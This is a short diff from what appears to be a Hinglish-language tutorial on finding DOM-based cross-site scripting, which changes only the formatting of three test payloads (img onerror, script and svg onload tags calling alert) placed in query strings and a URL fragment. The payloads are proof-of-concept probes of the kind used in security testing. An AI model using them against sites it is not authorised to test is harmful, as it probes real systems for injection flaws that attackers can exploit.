@@ -14,11 +14,11 @@ Kahan gaya: document.write, innerHTML, eval, etc.
 
 Payload test kar:
 
-?q=<img src=x onerror=alert(1)>
+```?q=<img src=x onerror=alert(1)>```
 
-?search=<script>alert(1)</script>
+```?search=<script>alert(1)</script>```
 
-#<svg onload=alert(1)>
+```#<svg onload=alert(1)>```
 
 Jahan pop-up aaye, wahan XSS done ✅
 
